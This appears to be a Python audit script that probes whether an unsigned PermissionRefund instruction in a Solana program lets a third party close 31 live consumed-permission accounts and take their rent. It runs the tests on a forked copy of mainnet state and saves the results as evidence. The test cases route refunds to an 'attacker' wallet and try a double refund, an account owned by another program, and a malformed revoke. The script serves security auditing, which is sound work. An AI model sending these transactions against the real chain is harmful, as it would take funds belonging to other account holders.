"""WB-R series: PermissionRefund (disc 6) / PermissionRevoke (disc 5) on LIVE consumed-permission
accounts, executed as state-preserving fork transactions.

Why: PermissionRefund takes only [consumedPermission W, refundDestination W] and NO signer.
Live mainnet state (fetched this session) shows 31 program-owned 64-byte consumed_permission
accounts, all with safe_to_close_slot in the past and refund_destination == Pubkey::default()
(i.e. 11111111111111111111111111111111). Question: can a third party close them and take rent?
"""
import sys, json, struct, base64, time
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction

WB = "waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
PCFG = "8Sz6ihaNiWVNQM2MRArqrZa8RpGxr7SzRYSSr5cgeDDi"

actor = F.load_actor()
A = str(actor.pubkey())
ata_wsol = "HMRvmgya8xKgDsbZfLGrYEjGNeFrJSe27JBhsAE2P7jh"

live = json.load(open("/home/user/orca-audit/recon/wb_consumed_permissions.json"))
now = F.get_slot()
targets = [d["address"] for d in live["accounts"] if d["safe_to_close_slot"] <= now]
print("fork slot:", now, "closable live consumed-permission accounts:", len(targets))

results = []


def ix_refund(consumed, dest):
    return Instruction(F.pk(WB), bytes([6]), [F.AM(consumed, writable=True), F.AM(dest, writable=True)])


def ix_revoke(consumed, msg_bytes, sig_bytes):
    return Instruction(F.pk(WB), bytes([5]) + msg_bytes + sig_bytes,
                       [F.AM(A, writable=True, signer=True), F.AM(PCFG), F.AM(consumed, writable=True),
                        F.AM(F.SYSTEM)])


def run(name, ixs, watch, note=""):
    before = F.snapshot(watch, tokenaddrs={a for a in watch if a == ata_wsol})
    r = F.send(ixs, actor)
    slot = F.get_slot()
    after = F.snapshot(watch, tokenaddrs={a for a in watch if a == ata_wsol})
    d = F.diff(before, after)
    det = r.get("detail", {})
    rec = {"case": name, "note": note, "slot": slot, "sig": r.get("result"),
           "send_error": r.get("error"), "tx_err": det.get("err"),
           "logs": det.get("logs", [])[-8:], "diff": d,
           "actor_lamports_after": after.get(A, {}).get("lamports"),
           "actor_wsol_after": (after.get(ata_wsol) or {}).get("token", {}).get("amount"),
           "before_actor_lamports": before.get(A, {}).get("lamports"),
           "before_wsol": (before.get(ata_wsol) or {}).get("token", {}).get("amount")}
    results.append(rec)
    print(f"\n== {name} {note}")
    print("   sig:", rec["sig"], " slot:", slot)
    print("   err:", json.dumps(rec["tx_err"]) or rec["send_error"])
    print("   diff:", json.dumps(d)[:400])
    print("   logs:", " | ".join(x.strip() for x in rec["logs"])[:400])
    return rec


watch0 = [A, ata_wsol]
# R01: attacker wallet as refund destination on the first closable live consumed-permission
t0 = targets[0]
watch = watch0 + [t0]
run("WB-R01 refund dest=attacker wallet", [ix_refund(t0, A)], watch,
    f"consumed={t0} (dest field = system program)")

# R02: attacker WSOL ATA as destination, second live account
t1 = targets[1]
run("WB-R02 refund dest=attacker WSOL ata", [ix_refund(t1, ata_wsol)], watch0 + [t1], f"consumed={t1}")

# R03: the *stored* destination (system program id) as writable account -> allowed by the
#      binding check?  (runtime may reject marking a program account writable)
run("WB-R03 refund dest=system program (stored value)", [ix_refund(t0, F.SYSTEM)], watch0 + [t0],
    "tests whether binding is to the stored field")

# R04: refund the same account twice (double refund)
run("WB-R04 refund same account twice", [ix_refund(t0, A), ix_refund(t0, A)], watch0 + [t0],
    "second call must fail if the first closed it")

# R05: refund with a *nonexistent* consumed permission
run("WB-R05 refund absent consumed pda", [ix_refund("1nexistent1111111111111111111111111111111111", A)],
    watch0, "should fail to load")

# R06: refund using a DIFFERENT owner's 64-byte account (a Whirlpool-owned one) -> owner check
run("WB-R06 refund non-wavebreak 64B account", [ix_refund(PCFG, A)], watch0 + [PCFG],
    "wrong space/discriminator")

# R07: revoke (disc 5) with attacker as funder, empty message
run("WB-R07 revoke attacker funder", [ix_revoke(t1, b"", b"")], watch0 + [t1], "malformed args")

json.dump({"forkSlotAtStart": now, "targets": targets, "results": results},
          open("/home/user/orca-audit/evidence/WBR_refund_revoke.json", "w"), indent=1)
print("\nsaved evidence/WBR_refund_revoke.json")
